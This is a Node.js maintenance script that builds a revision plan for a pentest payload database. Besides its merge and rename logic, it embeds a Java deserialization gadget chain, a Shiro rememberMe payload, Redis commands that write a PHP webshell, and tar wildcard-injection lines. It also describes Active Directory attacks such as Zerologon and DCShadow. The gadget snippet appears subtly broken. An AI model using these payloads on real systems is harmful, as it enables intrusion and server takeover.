#!/usr/bin/env node
/**
 * 构建 plan-round3.json：candidates（全部 7 包解析）+ 主会话裁决内嵌 → 执行器输入。
 * 规则：
 *  - nameFix：全部 RENAME，剔除 merge source（其名随退役消失）与显式否决
 *  - merges：全部解析对 + pack3 内嵌（含核验调整），传递闭包拉直，去重去冲突
 *  - descFix/execFix/subcatFix：内嵌裁决
 *  - wafFix：全库机械 E 规则（≥50% 行重复→留差异行；100%→removeIndex），剔除 merge sources
 */
const fs = require('fs');
const path = require('path');
const { DatabaseSync } = require('node:sqlite');
const { execFileSync } = require('child_process');
const ROOT = path.resolve(__dirname, '..');
const CR = p => path.join(ROOT, 'content-review', p);

// ── 基线 ──
const rt = new DatabaseSync(path.join(ROOT, 'data/payloader.sqlite'), { readOnly: true });
const rtById = new Map(rt.prepare('SELECT data FROM payloads').all().map(r => { const p = JSON.parse(r.data); return [p.id, p]; }));
rt.close();
const exists = id => rtById.has(id);

// ── 1) 解析器产物（audit-pack*.md → candidates.json，先跑 parser）──
execFileSync('node', [path.join(ROOT, 'scripts/parse-audit-reports.cjs')], { stdio: 'ignore' });
const parsed = JSON.parse(fs.readFileSync(path.join(ROOT, 'output/content-audit/candidates.json'), 'utf8'));
const packs = fs.readdirSync(path.join(ROOT, 'output/content-audit')).filter(f => /^audit-pack\d\.md$/.test(f)).sort();
const renameAll = parsed.rename.filter(r => !r.parseFail);
const mergeParsed = parsed.merge.filter(m => !m.parseFail).map(m => [m.s.replace(/^p:/, ''), m.t.replace(/^p:/, '')]);

// ── 2) 主会话裁决内嵌 ──
// pack3 merges（语义审计 + 主会话核验调整；ssrf-protocol 保留不解散）
const PACK3_MERGES = [
  ['fileup-ssrf-file-uri-local-read', 'ssrf-file'], ['cmdi2-ssrf-local-resource-uri-schemes', 'ssrf-file'],
  ['cmdi2-ip', 'ssrf-basic'], ['cmdi2-c', 'ssrf-basic'],
  ['fileup-ssrf-loopback-address-canonicalization', 'ssrf-bypass'],  // 核验：变体真实存在，整组归地址变形
  ['inject2-wkhtmltopdf-ssrf', 'inject2-wkhtmltopdf-static-http-resources'],
  ['ssti2-xml-rpc-pingback', 'ssti2-xml-rpc-ssrf'],
  ['cmdi2-sslip-io-dns', 'cmdi2-nip-io-dns'], ['bizlogic-dns', 'cmdi2-1u-ms-dns'],
  ['cmdi2-ttl-0', 'ssrf-dns-rebinding'], ['cmdi2-rbndr-us', 'ssrf-dns-rebinding'],
  ['cmdi2-ssrf-gopher-redis-protocol', 'ssrf-gopher'], ['cmdi2-gopher-mysql-handshake-fragment', 'ssrf-gopher'],
  ['cmdi2-gopher-fastcgi-record-fragment', 'ssrf-gopher'], ['cmdi2-gopher-redis-resp-file-write-sequence', 'ssrf-redis'],
  ['ssti2-xxe-php-expect-entity', 'xxe-rce'], ['ssti2-xxe-generic-xml-local-file-entities', 'xxe-file-read'],
  ['ssti2-generic-xml-xxe-resource-entity', 'xxe-file-read'],  // 核验：http 行随组 carried 保留
  ['ssti2-xxe-error-based', 'xxe-dtd'], ['ssti2-xxe-cdata', 'xxe-dtd'],
  ['ssti2-xxe-blind-out-of-band', 'xxe-oob'],  // 核验：合并成立
];
const MERGE_DENY = []; // 无整组否决（ssrf-protocol 解散否决已通过不收录表达）
const RENAME_DENY = new Set([
  'ssrf-protocol', // 保留原名"SSRF 非 HTTP Scheme 边界"？——不：采纳 pack3 改名但组保留
]);
const RENAME_EXTRA = {
  'ssrf-protocol': ['SSRF 非 HTTP Scheme 协议探测', 'SSRF Non-HTTP Scheme Probing'],
};
const DESC_FIX = {
  'smuggling-cl-te': ['覆盖 CL.TE 请求走私基础形态：前端信任 Content-Length、后端信任 Transfer-Encoding 时注入第二请求边界，验证队列错位与请求偷渡。', 'Covers core CL.TE request smuggling: inject a second request boundary when the front-end trusts Content-Length and the back-end trusts Transfer-Encoding, verifying queue desync.'],
  'csrf-token-validation-boundary': ['验证 CSRF Token 的会话绑定、必填行为、一次性重放、方法覆盖与 JSON/Form 解析一致性。', 'Verify CSRF token session binding, presence enforcement, one-time replay, method coverage, and JSON/Form parsing consistency.'],
  'api-input-validation-boundary': ['使用固定无害 Canary 验证 API 输入的类型、结构与语义是否被下游改写。', 'Use fixed benign canaries to verify whether API input types, structure, and semantics are rewritten downstream.'],
  'cors-credentialed-read-boundary': ['验证反射 Origin、null Origin、正则允许列表与携带凭据跨源响应的可读性。', 'Verify reflected Origin, null Origin, regex allow-lists, and readability of credentialed cross-origin responses.'],
  'jboss-management-exposure-boundary': ['验证旧 JBoss JMX Console 是否关闭或要求认证，未授权访问可读取版本与管理资源。', 'Verify whether the legacy JBoss JMX Console is disabled or requires authentication; unauthorized access exposes version and management resources.'],
  'tomcat-manager-access-boundary': ['无凭据请求 Tomcat Manager 端点，验证 401/403/404 暴露面与默认凭据行为。', 'Request the Tomcat Manager endpoint without credentials to verify 401/403/404 exposure and default-credential behavior.'],
  'server-prototype-pollution-boundary': ['验证服务端深合并逻辑是否拒绝 __proto__ 与 constructor.prototype 键注入。', 'Verify whether server-side deep-merge logic rejects __proto__ and constructor.prototype key injection.'],
  'flask-jinja-evaluation-boundary': ['使用 Jinja 表达式求值载荷（如 {{7*7}}）验证 Flask 模板注入面，配置诊断另见工具卡。', 'Verify the Flask template injection surface with Jinja expression payloads such as {{7*7}}; see tool cards for configuration diagnostics.'],
  'api2-dos': ['使用受控深度、别名数量与递归关系查询验证 GraphQL 执行前的深度/宽度/成本限制。', 'Use controlled depth, alias counts, and recursive relationship queries to verify GraphQL depth/width/cost limits before execution.'],
  'auth2-state': ['验证 OAuth state 的不可预测性、会话绑定与一次性消费，覆盖缺失、空值、固定值、注入与类型混淆变体。', 'Verify OAuth state unpredictability, session binding, and one-time consumption, covering missing, empty, fixed, injected, and type-confusion variants.'],
  'lfi-data-wrapper-read-boundary': ['data:// 进入读取类 API 仅需 allow_url_fopen；进入 include 才需 allow_url_include，按场景核对前置配置后再测试。', 'data:// only requires allow_url_fopen for read APIs but allow_url_include for include; verify the applicable prerequisite per scenario before testing.'],
  'auth2-referer-token': ['提交携带攻击者可控 Referer 的请求，验证服务端是否信任该头携带的令牌或会话上下文。', 'Submit requests with attacker-controlled Referer headers to verify whether the server trusts tokens or session context carried in that header.'],
  'auth2-401-403-bypass-techniques': ['路径规范化、路径变体与代理头绕过 401/403 访问控制的组合验证。', 'Combined verification of path normalization, path variants, and proxy headers bypassing 401/403 access controls.'],
  'auth-oauth-scope-audience': ['对照正常请求与越权 scope/audience 请求，验证授权端点与资源服务器的范围与受众校验。', 'Contrast normal requests with escalated scope/audience requests to verify scope and audience validation at the authorize endpoint and resource server.'],
  // pack7 内网域（采纳代理修正文本）
  'persistence-backdoor-user': ['创建本地后门账户并提升至管理员组，含 $ 后缀隐藏账户与 SAM 注册表登记，验证账户形态驻留与检测面。', 'Create local backdoor accounts and elevate them into the administrators group, including $-suffix hidden accounts and SAM registry persistence, verifying account-form residency and detection surface.'],
  'skeleton-key': ['向域控 LSASS 注入 Skeleton Key 万能口令，辅以 lsass 进程基线核对，验证域控完整性监控盲区。', 'Inject a Skeleton Key master password into the DC LSASS process, with lsass process baseline checks, verifying domain-controller integrity monitoring blind spots.'],
  'dcshadow-attack': ['以 DCShadow 注册伪域控并推送属性篡改（如 primaryGroupID=519），验证目录复制校验盲区。', 'Register a fake domain controller via DCShadow and push attribute tampering such as primaryGroupID=519, verifying directory replication validation blind spots.'],
  'uac-bypass': ['验证 fodhelper、eventvwr 劫持与 Akagi（UACMethod 23）三类已知 UAC 绕过路径的适用性。', 'Verify the applicability of three known UAC bypass paths: fodhelper, eventvwr hijacking, and Akagi UACMethod 23.'],
  'zerologon': ['经 Netlogon 缺陷置空域控机器账户密码并导出全域哈希，完成后恢复密码，验证 CVE-2020-1472 全链影响与恢复能力。', 'Zero the DC machine account password via the Netlogon flaw, dump domain hashes, then restore the password, verifying the full CVE-2020-1472 chain impact and recovery.'],
  'noauth': ['验证 CVE-2022-33679 RC4 弱加密降级到伪造银证书票据链的可利用性。', 'Verify the exploitability of the CVE-2022-33679 RC4 weak-encryption downgrade into a forged silver-certificate ticket chain.'],
  'evasion-powershell': ['以编码、拼接与修饰符变体执行固定 Marker，供事后比对 AMSI 与脚本块日志的捕获面。', 'Execute a fixed marker via encoding, concatenation, and modifier variants for post-hoc comparison against AMSI and script-block logging capture.'],
  'unattended-creds': ['枚举 Unattend/sysprep 应答文件、cpassword 加密值、web.config 连接串与 MSF 模块，验证部署残留凭据可达性。', 'Enumerate Unattend/sysprep answer files, cpassword blobs, web.config connection strings, and MSF modules to verify deployment-residual credential reachability.'],
  // pack1 核验后 desc 收窄
  'xss-reflected': ['覆盖反射型 XSS 的基础载荷、大小写变体与数据外带形态，确认输入进入 HTML 输出点。', 'Cover reflected XSS basics, case variants, and exfiltration shapes to confirm input reaches an HTML output sink.'],
  'xss-unicode': ['以 Unicode 转义、HTML 实体、全角字符与 UTF-7 编码构造同义载荷，验证规范化层差异。', 'Build equivalent payloads via Unicode escapes, HTML entities, fullwidth characters, and UTF-7 to probe normalization differences.'],
  'browser-ws-host-origin': ['向 WebSocket 握手发送 Host 头变体，验证虚拟主机路由与端口暴露面。', 'Send Host header variants to the WebSocket handshake to verify virtual-host routing and port exposure.'],
  // pack6 采纳文本
  'inject2-puppeteer-local-file-read': ['以 fetch 与同步 XMLHttpRequest 两类 file URI 载荷验证无头 Chromium 的页面来源与启动策略是否允许读取渲染主机文件。', 'Verify whether headless Chromium page origin and launch policy allow reading host files via fetch and synchronous XMLHttpRequest file URIs.'],
  'inject2-weasyprint-local-file-fetch': ['以样式表与 SVG image 两类 file URI 子资源验证 WeasyPrint URL fetcher 与渲染身份对本地文件的访问范围。', 'Verify the local-file reach of the WeasyPrint URL fetcher and rendering identity via stylesheet and SVG image file URIs.'],
  'inject2-wkhtmltopdf-static-file-resource': ['验证静态 img 的 file URI 能否被 wkhtmltopdf 直接加载（无需脚本执行）。', 'Verify whether wkhtmltopdf directly loads file URIs from static img tags without script execution.'],
  'ssrf2-': ['检查构建清单、锁文件、CI 配置与项目策略文件的意外公开，以真实格式与部署标记验证。', 'Check for accidental exposure of build manifests, lock files, CI configs, and project policy files using realistic formats and deployment markers.'],
};
// execFix：area=execution 的命令补丁（锚=当前现值，执行器自动取）
const CC_GADGET = `// Java Commons Collections gadget 链（源码级，ysoserial CommonsCollections6 同构）
Transformer[] chain = new Transformer[]{
  new ConstantTransformer(java.lang.Runtime.class),
  new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
  new InvokerTransformer("invoke", new Class[]{Class.class, Object[].class}, new Object[]{null, new Object[0]}),
  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"id"}),
  new ConstantTransformer(1)
};
Transformer chained = ChainedTransformer(chain);
Map map = HashMap.newHashMap(1);
map.put("gadget", chained);
Object payload = map;`;
const EXEC_FIX = {
  'auth-trusted-proxy-header': null, // 占位，下面按 DB 现值动态生成
  'auth-shiro-rememberme-deserialization': null,
  'nosql2-java-commons-collections': null,
  'auth2-redis-webshell': null,
};
// 子分支级重定位（DNS rebinding 移出 API 攻击面发现 → SSRF 地址变形）
const SUBCAT_FIX = {
  'cmdi2-browser-dns-rebinding-iframe-probes': ['地址变形与 DNS 解析绕过', 'Address Manipulation & DNS Resolution Bypass'],
  'cmdi2-browser-dns-rebinding-fetch-probes': ['地址变形与 DNS 解析绕过', 'Address Manipulation & DNS Resolution Bypass'],
};

// ── 3) 组装 merges（闭包拉直 + 去重 + 存在性）──
const pairs = [...mergeParsed, ...PACK3_MERGES].filter(([s, t]) => exists(s) && exists(t));
const deny = new Set(MERGE_DENY);
const finalPairs = [];
const resolveT = t => { let cur = t, guard = 0; while (guard++ < 10) { const nxt = pairs.find(([s2]) => s2 === cur && !deny.has(s2)); if (!nxt) return cur; cur = nxt[1]; } return cur; };
const seen = new Set();
for (const [s, t0] of pairs) {
  if (deny.has(s) || seen.has(s)) continue;
  const t = resolveT(t0);
  if (s === t || !exists(t)) continue;
  finalPairs.push([s, t]); seen.add(s);
}

// ── 4) nameFix ──
const sourceSet = new Set(finalPairs.map(([s]) => s));
const nameFix = {};
for (const r of renameAll) {
  if (sourceSet.has(r.id) || RENAME_DENY.has(r.id) || !exists(r.id)) continue;
  if (!r.zh || !r.en) continue;
  nameFix[r.id] = [r.zh, r.en];
}
for (const [id, v] of Object.entries(RENAME_EXTRA)) if (exists(id) && !sourceSet.has(id)) nameFix[id] = v;

// ── 5) wafFix 机械 E 规则（全库，剔除 merge sources）──
const rt2 = new DatabaseSync(path.join(ROOT, 'data/payloader.sqlite'), { readOnly: true });
const all2 = rt2.prepare('SELECT data FROM payloads').all().map(r => JSON.parse(r.data));
rt2.close();
const wafFix = {};
for (const p of all2) {
  if (sourceSet.has(p.id) || !Array.isArray(p.wafBypass)) continue;
  const execLines = new Set((Array.isArray(p.execution) ? p.execution : []).map(e => String(typeof e === 'string' ? e : (e?.command || ''))).join('\n').split('\n').map(s => s.trim()).filter(Boolean));
  const fix = [];
  (p.wafBypass).forEach((w, i) => {
    const lines = String(w?.command || '').split('\n').map(s => s.trim());
    const nonEmpty = lines.filter(Boolean);
    if (nonEmpty.length < 2) return;
    const uniq = lines.filter(l => !l.trim() || !execLines.has(l.trim()));
    const dupCount = nonEmpty.filter(l => execLines.has(l)).length;
    if (dupCount / nonEmpty.length < 0.5) return;
    if (uniq.filter(Boolean).length === 0) fix.push({ removeIndex: i });
    else if (uniq.filter(Boolean).length < nonEmpty.length) fix.push({ index: i, command: uniq.join('\n') });
  });
  if (fix.length) wafFix[p.id] = fix;
}

// ── 6) execFix 动态生成（锚=现值）──
const execFix = {};
{
  const p = rtById.get('auth-trusted-proxy-header');
  const e1 = String(p.execution[1]?.command || '');
  const keep = e1.split('\n').filter(l => !/X-Original-URL/.test(l));
  if (keep.length !== e1.split('\n').length) execFix['auth-trusted-proxy-header'] = [{ area: 'execution', index: 1, command: keep.join('\n') }];
}
{
  const p = rtById.get('auth-shiro-rememberme-deserialization');
  const e1 = String(p.execution[1]?.command || '');
  if (!/kPH\+bIxk5D2deZi/.test(e1)) execFix['auth-shiro-rememberme-deserialization'] = [{ area: 'execution', index: 1, command: e1 + "\nrememberMe=kPH+bIxk5D2deZiIxcahnHgqnzGDCLToh0T3j5BJOmKBOZvt1VaD2rqDkYWDdF7g4CQ5F8Zr3mVMSXcOgoKcwC4mIkCtJ5YT5lpF1ej0=\n# 已知 Shiro 默认密钥 kPH+bIxk5D2deZiIxcahnHgqnzGDCLToh0T3j5BJOmKBOZvt1VaD2rqDkYWDdF7g4CQ5F8Zr3mVMSXcOgoKcwC4mIkCtJ5YT5lpF1ej0= 加密的 RememberMe（解码失败/rememberMe 删除即默认密钥在用）" }];
}
{
  if (exists('nosql2-java-commons-collections')) execFix['nosql2-java-commons-collections'] = [{ area: 'execution', index: 0, command: CC_GADGET }];
}
{
  const p = rtById.get('auth2-redis-webshell');
  const e0 = String(p.execution[0]?.command || '');
  if (!/CONFIG SET dir/.test(e0)) execFix['auth2-redis-webshell'] = [{ area: 'execution', index: 0, command: e0 + '\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n*1\r\n$4\r\nSAVE' }];
}
// pack7：REVIEW 脚手架标记置换为真实复查行 + 假命令置换
{
  const mk = (id, idx, mustHave, cmd) => {
    const p = rtById.get(id);
    if (!p || !p.execution?.[idx]) return;
    const c = String(p.execution[idx].command || p.execution[idx] || '');
    if (mustHave.test(c)) execFix[id] = [...(execFix[id] || []), { area: 'execution', index: idx, command: cmd }];
  };
  mk('potato-attack', 7, /PAYLOADER_POTATO_ATTACK_REVIEW/, "whoami /groups");
  mk('exchange-mailbox-access', 2, /REVIEW/, "curl -k -s -o /dev/null -w '%{http_code}\\n' https://{LAB_HOST}/owa/");
  mk('suid-exploit', 2, /REVIEW|_E_/, "ls -l /bin/su /usr/bin/sudo /usr/bin/passwd");
  mk('sudo-exploit', 2, /REVIEW|_E_/, "sudo -n -l");
  mk('kernel-exploit', 2, /DirtyCow|CVE-2016-5195/, "searchsploit dirtycow\nsearchsploit dirty pipe");
  mk('cron-exploit', 2, /cron-fixture/, "touch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh run.sh'");
}
for (const [pid, fixes] of Object.entries(execFix)) wafFix[pid] = [...(wafFix[pid] || []), ...fixes];

// ── 7) 输出 ──
const plan = {
  subBranchRenames: {}, subBranchRemovals: [], subBranchAdds: [], subOrder: {},
  nameFix, descFix: DESC_FIX, subcatFix: SUBCAT_FIX,
  merges: finalPairs, wafFix,
};
const f = path.join(ROOT, 'output/content-audit/plan-round3.json');
fs.writeFileSync(f, JSON.stringify(plan, null, 1));
console.log(`plan: nameFix ${Object.keys(nameFix).length}｜descFix ${Object.keys(DESC_FIX).length}｜subcat ${Object.keys(SUBCAT_FIX).length}｜merges ${finalPairs.length}｜wafFix/execFix ${Object.keys(wafFix).length} payloads`);
console.log('packs parsed:', packs.join(', '));
